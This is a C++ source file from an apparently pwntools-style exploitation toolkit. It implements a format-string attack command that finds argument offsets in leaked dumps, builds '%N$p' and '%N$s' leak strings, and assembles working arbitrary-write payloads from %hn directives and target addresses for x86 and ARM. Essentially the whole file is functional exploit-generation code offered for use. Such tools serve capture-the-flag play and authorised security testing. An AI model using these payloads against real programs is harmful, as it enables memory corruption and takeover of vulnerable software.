// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 manop55555

#include "abcpwn/commands/fmt.hpp"

#include <algorithm>
#include <array>
#include <cctype>
#include <charconv>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <sstream>
#include <string>
#include <string_view>
#include <utility>
#include <vector>

#include <CLI/CLI.hpp>

#include "abcpwn/arch/arch.hpp"

namespace abcpwn::commands::fmt {

namespace {

[[nodiscard]] std::optional<std::uint64_t> parse_hex_word(std::string_view tok) {
    if (tok.size() >= 2 && (tok[0] == '0') && (tok[1] == 'x' || tok[1] == 'X')) {
        tok.remove_prefix(2);
    }
    if (tok.empty()) {
        return std::nullopt;
    }
    std::uint64_t v = 0;
    const auto* end = tok.data() + tok.size();
    const auto res = std::from_chars(tok.data(), end, v, 16);
    if (res.ec != std::errc{} || res.ptr != end) {
        return std::nullopt;
    }
    return v;
}

} // namespace

std::optional<std::size_t> find_marker_offset(std::string_view dump, std::uint64_t marker) {
    // Tokenize by anything non-hex; collect each token, parse, return
    // 1-based index of first hit.
    std::size_t idx = 0;
    std::size_t start = 0;
    auto handle_token = [&](std::string_view t) -> std::optional<std::size_t> {
        if (t.empty())
            return std::nullopt;
        ++idx;
        if (auto v = parse_hex_word(t); v && *v == marker) {
            return idx;
        }
        return std::nullopt;
    };
    for (std::size_t i = 0; i < dump.size(); ++i) {
        const char c = dump[i];
        const auto uc = static_cast<unsigned char>(c);
        const bool is_hex_char = (std::isxdigit(uc) != 0) || c == 'x' || c == 'X';
        if (!is_hex_char) {
            if (auto r = handle_token(dump.substr(start, i - start)))
                return r;
            start = i + 1;
        }
    }
    if (auto r = handle_token(dump.substr(start)))
        return r;
    return std::nullopt;
}

std::string build_leak_payload(std::size_t arg_index, bool as_string) {
    char buf[32];
    std::snprintf(buf, sizeof buf, "%%%zu$%c", arg_index, as_string ? 's' : 'p');
    return std::string(buf);
}

core::Result<std::vector<std::uint8_t>> build_write_payload(const WriteSpec& spec) {
    if (spec.arg_index == 0) {
        return core::err(core::ErrorCode::InvalidInput,
                         "fmt: --arg-position must be set for a write payload");
    }
    if (spec.arch != arch::Arch::X86 && spec.arch != arch::Arch::X86_64
        && spec.arch != arch::Arch::Arm && spec.arch != arch::Arch::Aarch64) {
        return core::err(core::ErrorCode::Unsupported,
                         "fmt: write payload only supported on x86 / x86_64 / arm / aarch64");
    }
    const unsigned bits = arch::arch_bits(spec.arch);
    const std::size_t ptr_size = (bits == 64) ? 8u : 4u;

    // QA round 2 CRITICAL fix: layout is now directives-first,
    // addresses-last (matches pwntools fmtstr_payload). The
    // previous layout placed the 64-bit addresses at the front
    // where their NUL upper bytes terminated printf's format-
    // string scan and the %n directives never ran.
    //
    // New layout (target ptr_size = 8):
    //   "%<delta1>c%<addr_slot+0>$hn..."          <- directives
    //   <padding to ptr_size alignment>
    //   <addr+0><addr+2><addr+4><addr+6>
    //
    // spec.arg_index is the arg slot where the user's buffer
    // STARTS being read as format args (pwntools "offset"
    // semantics). The first address lands at arg slot
    //   slot0 = arg_index + ceil(directive_blob_size / ptr_size)
    // The directive blob references slot0..slot0+3. Because the
    // %d-style counts and arg indices are themselves digits whose
    // count depends on the magnitude, we iterate until the
    // computed slot0 stops changing (usually 2-3 passes).

    const std::array<std::uint16_t, 4> halves = {
        static_cast<std::uint16_t>((spec.value >> 0) & 0xffffU),
        static_cast<std::uint16_t>((spec.value >> 16) & 0xffffU),
        static_cast<std::uint16_t>((spec.value >> 32) & 0xffffU),
        static_cast<std::uint16_t>((spec.value >> 48) & 0xffffU),
    };

    // ordered: pairs of (half_value, slot_index_offset_relative_to_slot0)
    std::array<std::pair<std::uint16_t, std::size_t>, 4> ordered = {{
        {halves[0], 0U},
        {halves[1], 1U},
        {halves[2], 2U},
        {halves[3], 3U},
    }};
    std::sort(ordered.begin(), ordered.end(), [](const auto& a, const auto& b) {
        return a.first < b.first;
    });

    auto build_format_blob = [&](std::size_t slot0) {
        std::string fmt_str;
        std::uint32_t produced = static_cast<std::uint32_t>(spec.padding);
        for (const auto& [half, slot_off] : ordered) {
            std::int64_t need =
                static_cast<std::int64_t>(half) - static_cast<std::int64_t>(produced & 0xffffU);
            if (need <= 0) {
                need += 0x10000;
            }
            char buf[64];
            std::snprintf(
                buf, sizeof buf, "%%%lldc%%%zu$hn", static_cast<long long>(need), slot0 + slot_off);
            fmt_str.append(buf);
            produced += static_cast<std::uint32_t>(need);
        }
        return fmt_str;
    };

    // Iterate until slot0 converges. Round-up division gives the
    // smallest number of ptr_size slots the directive blob occupies.
    std::size_t slot0 = spec.arg_index;
    std::string fmt_str;
    for (int iter = 0; iter < 8; ++iter) {
        fmt_str = build_format_blob(slot0);
        const std::size_t total_dir_bytes = spec.padding + fmt_str.size();
        const std::size_t slots_consumed = (total_dir_bytes + ptr_size - 1) / ptr_size;
        const std::size_t new_slot0 = spec.arg_index + slots_consumed;
        if (new_slot0 == slot0) {
            break;
        }
        slot0 = new_slot0;
    }

    std::vector<std::uint8_t> out;
    out.reserve(spec.padding + fmt_str.size() + 4 * ptr_size + ptr_size);

    // Optional fixed padding (legacy --padding flag still honored)
    for (std::size_t i = 0; i < spec.padding; ++i) {
        out.push_back('A');
    }

    // Directives.
    for (char c : fmt_str) {
        out.push_back(static_cast<std::uint8_t>(c));
    }

    // Pad to ptr_size alignment with a printable filler ('a') so the
    // pre-address bytes never include a NUL that would terminate
    // printf early.
    while ((out.size() % ptr_size) != 0) {
        out.push_back(static_cast<std::uint8_t>('a'));
    }

    // Addresses at the END of the payload. Their NUL upper bytes
    // are now safely past every %hn directive that printf needs
    // to process.
    auto push_addr = [&](std::uint64_t addr) {
        for (std::size_t i = 0; i < ptr_size; ++i) {
            out.push_back(static_cast<std::uint8_t>((addr >> (i * 8)) & 0xffU));
        }
    };
    push_addr(spec.target_address + 0);
    push_addr(spec.target_address + 2);
    push_addr(spec.target_address + 4);
    push_addr(spec.target_address + 6);

    return out;
}

void FmtCommand::setup(CLI::App& app) {
    app.add_option(
        "--find-offset", find_offset_dump, "Locate 0x41414141 in a printf-style hex dump");
    app.add_option(
        "--leak", leak_address_hex, "Format-arg index whose value should be leaked as a string");
    app.add_option(
        "--write", write_spec, "Build a what-where payload: <addr>=<value> (hex literals)");
    app.add_option("--arg-position", arg_position, "Format-arg position (1-based) used by --write");
    app.add_option("--arch", arch_str, "x86 | x86_64 | arm | aarch64 (default x86_64)");
    app.add_option("--start-offset", start_offset, "Skip first N args");
    app.add_option("--padding", padding, "Fixed padding bytes before format string");
}

namespace {

[[nodiscard]] core::Result<std::pair<std::uint64_t, std::uint64_t>>
parse_write_spec(std::string_view s) {
    const auto eq = s.find('=');
    if (eq == std::string_view::npos) {
        return core::err(core::ErrorCode::UsageError, "fmt: --write expects <addr>=<value>");
    }
    auto addr = parse_hex_word(s.substr(0, eq));
    auto val = parse_hex_word(s.substr(eq + 1));
    if (!addr || !val) {
        return core::err(core::ErrorCode::InvalidInput, "fmt: --write addr or value not hex");
    }
    return std::make_pair(*addr, *val);
}

} // namespace

core::Result<core::CommandResult> FmtCommand::run(const core::Context& /*ctx*/) {
    core::CommandResult res;

    if (!find_offset_dump.empty()) {
        auto idx = find_marker_offset(find_offset_dump);
        if (!idx) {
            return core::err(core::ErrorCode::NotFound,
                             "fmt: 0x41414141 not present in --find-offset dump");
        }
        res.raw_lines.push_back("offset: " + std::to_string(*idx));
        return res;
    }

    if (!leak_address_hex.empty()) {
        auto idx_opt = parse_hex_word(leak_address_hex);
        if (!idx_opt) {
            return core::err(core::ErrorCode::InvalidInput,
                             "fmt: --leak expects a hex argument index (e.g., 0x6)");
        }
        const auto idx = static_cast<std::size_t>(*idx_opt);
        res.raw_lines.push_back(build_leak_payload(idx + start_offset));
        return res;
    }

    if (!write_spec.empty()) {
        auto parsed = parse_write_spec(write_spec);
        if (!parsed) {
            return core::err(parsed.error());
        }
        if (arg_position <= 0) {
            return core::err(core::ErrorCode::UsageError,
                             "fmt: --write requires --arg-position N (1-based)");
        }
        const auto a = arch::arch_from_string(arch_str);
        if (!a) {
            return core::err(core::ErrorCode::UsageError, "fmt: unknown arch '" + arch_str + "'");
        }
        WriteSpec ws;
        ws.target_address = parsed->first;
        ws.value = parsed->second;
        ws.arg_index = static_cast<std::size_t>(arg_position);
        ws.arch = *a;
        ws.padding = padding;
        auto payload = build_write_payload(ws);
        if (!payload) {
            return core::err(payload.error());
        }
        // Emit as escaped hex.
        std::string s;
        for (auto b : *payload) {
            char buf[8];
            std::snprintf(buf, sizeof buf, "\\x%02x", b);
            s.append(buf);
        }
        res.raw_lines.push_back(s);
        return res;
    }

    if (arg_position > 0) {
        // `--arg-position N` alone: just describe the slot.
        res.raw_lines.push_back(
            "arg " + std::to_string(arg_position + static_cast<std::int64_t>(start_offset))
            + " is the " + std::to_string(arg_position) + "th format argument");
        return res;
    }

    return core::err(core::ErrorCode::UsageError,
                     "fmt: provide one of --find-offset, --leak, --write, or --arg-position");
}

} // namespace abcpwn::commands::fmt
